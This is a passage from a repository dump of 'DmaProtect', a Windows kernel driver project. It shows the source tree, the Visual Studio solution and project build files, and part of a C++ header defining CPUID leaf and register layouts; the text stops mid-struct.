Project Path: arc_gmh5225_DmaProtect_k80tyv51

Source Tree:

```txt
arc_gmh5225_DmaProtect_k80tyv51
├── AMD-IO-virt-spec.pdf
├── DmaProtect
│   ├── DmaProtect.vcxproj
│   ├── DmaProtect.vcxproj.filters
│   ├── include
│   │   ├── Arch
│   │   │   ├── Cpuid.h
│   │   │   ├── Hyper-V.h
│   │   │   ├── Interrupts.h
│   │   │   ├── Intrinsics.h
│   │   │   ├── Msr.h
│   │   │   ├── Pte.h
│   │   │   ├── Registers.h
│   │   │   ├── Segmentation.h
│   │   │   ├── Svm.h
│   │   │   └── Vmx.h
│   │   ├── Memory.h
│   │   ├── acpi.h
│   │   ├── cpp.h
│   │   ├── cpu.h
│   │   ├── ddma.h
│   │   ├── iommu.h
│   │   ├── macros.h
│   │   ├── pe.h
│   │   ├── signatures.h
│   │   ├── status.h
│   │   ├── threading.h
│   │   └── win.h
│   └── src
│       ├── Memory.cpp
│       ├── acpi.cpp
│       ├── cpp.cpp
│       ├── cpu.cpp
│       ├── ddma.cpp
│       ├── iommu.cpp
│       ├── main.cpp
│       ├── threading.cpp
│       └── win.cpp
├── DmaProtect.sln
├── Docs.md
├── LICENSE
├── README.md
├── kdmapper
│   ├── HelloWorld
│   │   ├── HelloWorld.sln
│   │   ├── HelloWorld.vcxproj
│   │   ├── HelloWorld.vcxproj.filters
│   │   └── main.cpp
│   ├── HelloWorld.sys
│   ├── LICENSE
│   ├── README.MD
│   ├── kdmapper
│   │   ├── intel_driver.cpp
│   │   ├── intel_driver.hpp
│   │   ├── intel_driver_resource.hpp
│   │   ├── kdmapper.cpp
│   │   ├── kdmapper.hpp
│   │   ├── kdmapper.vcxproj
│   │   ├── kdmapper.vcxproj.filters
│   │   ├── main.cpp
│   │   ├── nt.hpp
│   │   ├── portable_executable.cpp
│   │   ├── portable_executable.hpp
│   │   ├── service.cpp
│   │   ├── service.hpp
│   │   ├── utils.cpp
│   │   └── utils.hpp
│   └── kdmapper.sln
└── vt-directed-io-spec.pdf

```

`DmaProtect.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.6.33717.318
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "DmaProtect", "DmaProtect\DmaProtect.vcxproj", "{46CB5F45-AF1E-458C-8287-AF9196DC9260}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "kdmapper", "kdmapper\kdmapper\kdmapper.vcxproj", "{518E0636-BA8F-459D-ACAC-81BD33475E3E}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|ARM = Debug|ARM
		Debug|ARM64 = Debug|ARM64
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|ARM = Release|ARM
		Release|ARM64 = Release|ARM64
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM.ActiveCfg = Debug|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM.Build.0 = Debug|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM64.ActiveCfg = Debug|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM64.Build.0 = Debug|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x64.ActiveCfg = Debug|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x64.Build.0 = Debug|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x86.ActiveCfg = Debug|Win32
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x86.Build.0 = Debug|Win32
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM.ActiveCfg = Release|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM.Build.0 = Release|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM64.ActiveCfg = Release|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM64.Build.0 = Release|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x64.ActiveCfg = Release|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x64.Build.0 = Release|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x86.ActiveCfg = Release|Win32
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x86.Build.0 = Release|Win32
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|ARM.ActiveCfg = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|ARM.Build.0 = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|ARM64.ActiveCfg = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|ARM64.Build.0 = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|x64.ActiveCfg = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|x64.Build.0 = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|x86.ActiveCfg = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|x86.Build.0 = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|ARM.ActiveCfg = Release|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|ARM.Build.0 = Release|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|ARM64.ActiveCfg = Release|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|ARM64.Build.0 = Release|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|x64.ActiveCfg = Release|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|x64.Build.0 = Release|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|x86.ActiveCfg = Release|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|x86.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D852F210-A100-4274-A2B8-AA903236B6CD}
	EndGlobalSection
EndGlobal

```

`DmaProtect/DmaProtect.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM">
      <Configuration>Debug</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM">
      <Configuration>Release</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{46CB5F45-AF1E-458C-8287-AF9196DC9260}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>ddma</RootNamespace>
    <WindowsTargetPlatformVersion>$(LatestTargetPlatformVersion)</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>false</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>false</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <Optimization>MaxSpeed</Optimization>
      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
      <DisableSpecificWarnings>4996;4603;4627;4986;4987;4996;4100;%(DisableSpecificWarnings)</DisableSpecificWarnings>
      <AdditionalIncludeDirectories>$(ProjectDir)include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
    <Link>
      <EntryPointSymbol>DriverEntry</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <AdditionalIncludeDirectories>$(ProjectDir)include;$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <DisableSpecificWarnings>4996;4748;%(DisableSpecificWarnings)</DisableSpecificWarnings>
    </ClCompile>
    <Link>
      <EntryPointSymbol>DriverEntry</EntryPointSymbol>
    </Link>
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="src\ddma.cpp" />
    <ClCompile Include="src\cpp.cpp" />
    <ClCompile Include="src\iommu.cpp" />
    <ClCompile Include="src\acpi.cpp" />
    <ClCompile Include="src\cpu.cpp" />
    <ClCompile Include="src\main.cpp" />
    <ClCompile Include="src\Memory.cpp" />
    <ClCompile Include="src\win.cpp" />
    <ClCompile Include="src\threading.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="include\ddma.h" />
    <ClInclude Include="include\cpp.h" />
    <ClInclude Include="include\acpi.h" />
    <ClInclude Include="include\cpu.h" />
    <ClInclude Include="include\macros.h" />
    <ClInclude Include="include\Memory.h" />
    <ClInclude Include="include\signatures.h" />
    <ClInclude Include="include\status.h" />
    <ClInclude Include="include\iommu.h" />
    <ClInclude Include="include\win.h" />
    <ClInclude Include="include\pe.h" />
    <ClInclude Include="include\threading.h" />
  </ItemGroup>
  <ItemGroup>
    <None Include="Docs.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`DmaProtect/DmaProtect.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="include">
      <UniqueIdentifier>{2da6f8f4-0a93-4983-8bbf-ef4a840a33f2}</UniqueIdentifier>
    </Filter>
    <Filter Include="src">
      <UniqueIdentifier>{de0a9c86-5c03-4091-b1a9-cfd14813fed8}</UniqueIdentifier>
    </Filter>
    <Filter Include="src\dma">
      <UniqueIdentifier>{bc5c3b8d-0f7c-44d2-a0ab-2c0c6a8850af}</UniqueIdentifier>
    </Filter>
    <Filter Include="src\helper">
      <UniqueIdentifier>{b4d0acd4-25ae-4632-9af8-13c920340ac8}</UniqueIdentifier>
    </Filter>
    <Filter Include="include\dma">
      <UniqueIdentifier>{c58ce957-8788-42ae-b77d-40d355f99022}</UniqueIdentifier>
    </Filter>
    <Filter Include="include\helper">
      <UniqueIdentifier>{f53b98bc-41f4-4319-99ed-6f9decafeb5e}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="include\acpi.h">
      <Filter>include\dma</Filter>
    </ClInclude>
    <ClInclude Include="include\cpu.h">
      <Filter>include\helper</Filter>
    </ClInclude>
    <ClInclude Include="include\macros.h">
      <Filter>include\helper</Filter>
    </ClInclude>
    <ClInclude Include="include\Memory.h">
      <Filter>include\helper</Filter>
    </ClInclude>
    <ClInclude Include="include\signatures.h">
      <Filter>include\helper</Filter>
    </ClInclude>
    <ClInclude Include="include\status.h">
      <Filter>include\helper</Filter>
    </ClInclude>
    <ClInclude Include="include\iommu.h">
      <Filter>include\dma</Filter>
    </ClInclude>
    <ClInclude Include="include\cpp.h">
      <Filter>include\helper</Filter>
    </ClInclude>
    <ClInclude Include="include\ddma.h">
      <Filter>include\dma</Filter>
    </ClInclude>
    <ClInclude Include="include\win.h">
      <Filter>include\helper</Filter>
    </ClInclude>
    <ClInclude Include="include\pe.h">
      <Filter>include\helper</Filter>
    </ClInclude>
    <ClInclude Include="include\threading.h">
      <Filter>include\helper</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="src\acpi.cpp">
      <Filter>src\dma</Filter>
    </ClCompile>
    <ClCompile Include="src\cpu.cpp">
      <Filter>src\helper</Filter>
    </ClCompile>
    <ClCompile Include="src\Memory.cpp">
      <Filter>src\helper</Filter>
    </ClCompile>
    <ClCompile Include="src\iommu.cpp">
      <Filter>src\dma</Filter>
    </ClCompile>
    <ClCompile Include="src\cpp.cpp">
      <Filter>src\helper</Filter>
    </ClCompile>
    <ClCompile Include="src\ddma.cpp">
      <Filter>src\dma</Filter>
    </ClCompile>
    <ClCompile Include="src\win.cpp">
      <Filter>src\helper</Filter>
    </ClCompile>
    <ClCompile Include="src\main.cpp" />
    <ClCompile Include="src\threading.cpp">
      <Filter>src\helper</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Docs.md" />
  </ItemGroup>
</Project>
```

`DmaProtect/include/Arch/Cpuid.h`:

```h
#pragma once

extern "C" void __cpuidex(int regs[4], int leaf, int subleaf);

#pragma pack(push, 1)

namespace Cpuid
{



template <auto leaf, auto subleaf = 0>
struct CpuidRequest
{
    static constexpr auto k_leaf = static_cast<unsigned int>(leaf);
    static constexpr auto k_subleaf = static_cast<unsigned int>(subleaf);
};



union RawCpuid
{
    int raw[4]{};
    struct
    {
        unsigned int eax;
        unsigned int ebx;
        unsigned int ecx;
        unsigned int edx;
    } regs;
};



template <typename Layout>
union CpuidLayout
{
    RawCpuid raw;
    Layout layout;

    const Layout* operator -> () const noexcept
    {
        return &layout;
    }

    Layout* operator -> () noexcept
    {
        return &layout;
    }

    const Layout& operator * () const noexcept
    {
        return layout;
    }

    Layout& operator * () noexcept
    {
        return layout;
    }
};



struct Cpuid
{
    static RawCpuid query(const unsigned int leaf, const unsigned int subleaf) noexcept
    {
        RawCpuid layout{};
        __cpuidex(&layout.raw[0], static_cast<int>(leaf), static_cast<int>(subleaf));
        return layout;
    }

    template <typename Layout>
    static CpuidLayout<Layout> query() noexcept
    {
        CpuidLayout<Layout> layout{};
        __cpuidex(&layout.raw.raw[0], static_cast<int>(Layout::k_leaf), static_cast<int>(Layout::k_subleaf));
        return layout;
    }
};



class OpaqueCpuid
{
private:
    RawCpuid m_raw;

public:
    template <typename Layout>
    const Layout& update() noexcept
    {
        m_raw = Cpuid::query(Layout::k_leaf, Layout::k_subleaf);
        return *reinterpret_cast<const Layout*>(&m_raw);
    }

    const RawCpuid& update(const unsigned int leaf, const unsigned int subleaf) noexcept
    {
        m_raw = Cpuid::query(leaf, subleaf);
        return m_raw;
    }
};



template <auto leaf>
struct SubleafMatcher
{
    enum class Subleaf
    {
        None
    };
};

template <auto leaf>
using Subleaf = typename SubleafMatcher<leaf>::Subleaf;



namespace Generic
{



// EAX values:
enum class GenericLeaf : unsigned int
{
    // Standard CPUID functions:
    MaximumFunctionNumberAndVendorId = 0x00000000,
    FeatureInformation = 0x00000001,
    MonitorMwaitParameters = 0x00000005,
    ThermalPowerManagement = 0x00000006,
    StructuredExtendedFeatureEnumeration = 0x00000007,

    // Extended CPUID functions:
    MaximumExtendedFunctionNumberAndVendorId = 0x80000000,
    ExtendedFeatureInformation = 0x80000001,
    ProcessorBrandString0 = 0x80000002,
    ProcessorBrandString1 = 0x80000003,
    ProcessorBrandString2 = 0x80000004,
};



namespace Layout
{



struct MaximumFunctionNumberAndVendorId
{
    unsigned int LargestStandardFunctionNumber;
    unsigned int VendorPart1; // 'uneG' || 'htuA'
    unsigned int VendorPart3; // 'letn' || 'DMAc' --> 'GenuineIntel' or 'AuthenticAMD' (EAX + EDX + ECX)
    unsigned int VendorPart2; // 'Ieni' || 'itne'

    bool isIntel() const
    {
        // GenuineIntel:
        return (VendorPart1 == 'uneG')
            && (VendorPart2 == 'Ieni')
            && (VendorPart3 == 'letn');
    }

    bool isAmd() const
    {
        // AuthenticAMD:
        return (VendorPart1 == 'htuA')
            && (VendorPart2 == 'itne')
            && (VendorPart3 == 'DMAc');
    }
};

struct MaximumExtendedFunctionNumberAndVendorId
{
    unsigned int LargestExtendedFunctionNumber;
    unsigned int VendorPart1; // 'uneG' || 'htuA'
    unsigned int VendorPart3; // 'letn' || 'DMAc' --> 'GenuineIntel' or 'AuthenticAMD' (EAX + EDX + ECX)
    unsigned int VendorPart2; // 'Ieni' || 'itne'

    bool isIntel() const
    {
        // GenuineIntel:
        return (VendorPart1 == 'uneG')
            && (VendorPart2 == 'Ieni')
            && (VendorPart3 == 'letn');
    }

    bool isAmd() const
    {
        // AuthenticAMD:
        return (VendorPart1 == 'htuA')
            && (VendorPart2 == 'itne')
            && (VendorPart3 == 'DMAc');
    }
};

struct FeatureInformation
{
    // EAX:
    unsigned int Stepping : 4;
    unsigned int Model : 4;
    unsigned int FamilyId : 4;
    unsigned int : 4;
    unsigned int ExtendedModelId : 4;
    unsigned int ExtendedFamilyId : 8;
    unsigned int : 4;

    // EBX:
    unsigned int BrandIndex : 8;
    unsigned int ClflushLineSize : 8; // Value * 8 = cache line size in bytes
    unsigned int LogicalProcessorCount : 8; // Valid only if CPUID.1.EDX.HTT == 1
    unsigned int InitialApicId : 8;

    // ECX:
    unsigned int SSE3 : 1; // 0
    unsigned int PCLMULQDQ : 1; // 1 
    unsigned int : 1; // 2 
    unsigned int MONITOR : 1; // 3
    unsigned int : 1; // 4
    unsigned int : 1; // 5
    unsigned int : 1; // 6
    unsigned int : 1; // 7
    unsigned int : 1; // 8
    unsigned int SSSE3 : 1;
    unsigned int : 2;
    unsigned int FMA : 1;
    unsigned int CMPXCHG16B : 1;
    unsigned int : 5;
    unsigned int SSE41 : 1;
    unsigned int SSE42 : 1;
    unsigned int : 1;
    unsigned int MOVBE : 1;
    unsigned int POPCNT : 1;
    unsigned int : 1;
    unsigned int AES : 1;
    unsigned int XSAVE : 1;
    unsigned int OSXSAVE : 1;
    unsigned int AVX : 1;
    unsigned int F16C : 1;
    unsigned int RDRAND : 1;
    unsigned int ReservedForHvGuestStatus : 1; // Reserved for use by hypervisor to indicate guest status

    // EDX:
    unsigned int FPU : 1;
    unsigned int VME : 1; // Virtual 8086-mode enhancements (including CR4.VME, CR4.PVI, EFLAGS.VIF and EFLAGS.VIP, etc.)
    unsigned int DE : 1; // Debugging extensions
    unsigned int PSE : 1; // Page size extension
    unsigned int TSC : 1; // Time stamp counter
    unsigned int MSR : 1; // RDMSR/WRMSR support
    unsigned int PAE : 1; // Physical address extensions support
    unsigned int MCE : 1; // Machine check exception
    unsigned int CMPXCHG8B : 1;
    unsigned int APIC : 1;
    unsigned int : 1;
    unsigned int SysEnterSysExit : 1; // SYSENTER/SYSEXIT instructions support
    unsigned int MTRR : 1; // Memory-Type Range Registers support
    unsigned int PGE : 1; // Page global bit (CR4.PGE bit controls this feature)
    unsigned int MCA : 1; // Machine check architecture
    unsigned int CMOV : 1; // Conditional move instruction support
    unsigned int PAT : 1; // Page attribute table
    unsigned int PSE36 : 1; // 36-bit page size extension
    unsigned int : 1;
    unsigned int CLFSH : 1; // CLFLUSH instruction support
    unsigned int : 3;
    unsigned int MMX : 1;
    unsigned int FXSR : 1; // FXSAVE and FXRSTOR support
    unsigned int SSE : 1;
    unsigned int SSE2 : 1;
    unsigned int : 1;
    unsigned int HTT : 1; // Max APIC IDs reserved field is Valid (CPUID.1.EBX.LogicalProcessorCount is valid)
    unsigned int : 3;
};

struct ExtendedFeatureInformation
{
    // EAX:
    unsigned int Stepping : 4;
    unsigned int Model : 4;
    unsigned int FamilyId : 4;
    unsigned int : 4;
    unsigned int ExtendedModelId : 4;
    unsigned int ExtendedFamilyId : 8;
    unsigned int : 4;

    // EBX:
    unsigned int : 32;

    // ECX:
    unsigned int LahfSahf : 1;
    unsigned int : 4;
    unsigned int LZCNT : 1;
    unsigned int : 2;
    unsigned int PREFETCHW : 1;
    unsigned int : 23;

    // EDX:
    unsigned int : 11;
    unsigned int SysCallSysRet : 1;
    unsigned int : 8;
    unsigned int NX : 1;
    unsigned int : 5;
    unsigned int Page1Gb : 1; // 1-Gb large page support
    unsigned int RDTSCP : 1;
    unsigned int : 1;
    unsigned int LongMode : 1; // 64-bit mode
    unsigned int : 2;
};

struct ProcessorBrandString0
{
    unsigned int Part0;
    unsigned int Part1;
    unsigned int Part2;
    unsigned int Part3;
};

struct ProcessorBrandString1
{
    unsigned int Part4;
    unsigned int Part5;
    unsigned int Part6;
    unsigned int Part7;
};

struct ProcessorBrandString2
{
    unsigned int Part8;
    unsigned int Part9;
    unsigned int Part10;
    unsigned int Part11;
};



} // namespace Layout



struct MaximumFunctionNumberAndVendorId
    : public Layout::MaximumFunctionNumberAndVendorId
    , public CpuidRequest<GenericLeaf::MaximumFunctionNumberAndVendorId>
{
};

struct MaximumExtendedFunctionNumberAndVendorId
    : public Layout::MaximumExtendedFunctionNumberAndVendorId
    , public CpuidRequest<GenericLeaf::MaximumExtendedFunctionNumberAndVendorId>
{
};

struct FeatureInformation
    : public Layout::FeatureInformation
    , public CpuidRequest<GenericLeaf::FeatureInformation>
{
};

struct ExtendedFeatureInformation
    : public Layout::ExtendedFeatureInformation
    , public CpuidRequest<GenericLeaf::ExtendedFeatureInformation>
{
};

struct ProcessorBrandString0
    : public Layout::ProcessorBrandString0
    , public CpuidRequest<GenericLeaf::ProcessorBrandString0>
{
};

struct ProcessorBrandString1
    : public Layout::ProcessorBrandString1
    , public CpuidRequest<GenericLeaf::ProcessorBrandString1>
{
};

struct ProcessorBrandString2
    : public Layout::ProcessorBrandString2
    , public CpuidRequest<GenericLeaf::ProcessorBrandString2>
{
};



} // namespace Generic



namespace Intel
{



// EAX values:
enum class IntelLeaf : unsigned int
{
    // Standard CPUID functions:
    MaximumFunctionNumberAndVendorId = 0x00000000,
    FeatureInformation = 0x00000001,
    CacheDescriptors = 0x00000002,
    ProcessorSerialNumber = 0x00000003,
    DeterministicCacheParameters = 0x00000004,
    MonitorMwaitParameters = 0x00000005,
    ThermalPowerManagement = 0x00000006,
    StructuredExtendedFeatureEnumeration = 0x00000007,
    // 0x00000008 is reserved
    DirectCacheAccessParameters = 0x00000009,
    ArchitecturalPerformanceMonitorFeatures = 0x0000000A,
    X2ApicFeatures = 0x0000000B,
    // 0x0000000C is reserved
    XsaveFeatures = 0x0000000D,

    // Extended CPUID functions:
    LargestExtendedFunction = 0x80000000,
    ExtendedFeatureInformation = 0x80000001,
    ProcessorBrandString0 = 0x80000002,
    ProcessorBrandString1 = 0x80000003,
    ProcessorBrandString2 = 0x80000004,
    // 0x80000005 is reserved
    ExtendedL2CacheFeatures = 0x80000006,
    AdvancedPowerManagement = 0x80000007,
    VirtualAndPhysicalAddressSizes = 0x80000008
};



namespace Layout
{



struct FeatureInformation
{
    // EAX:
    unsigned int Stepping : 4;
    unsigned int Model : 4;
    unsigned int FamilyId : 4;
    unsigned int ProcessorType : 2;
    unsigned int : 2;
    unsigned int ExtendedModelId : 4;
    unsigned int ExtendedFamilyId : 8;
    unsigned int : 4;

    // EBX:
    unsigned int BrandIndex : 8;
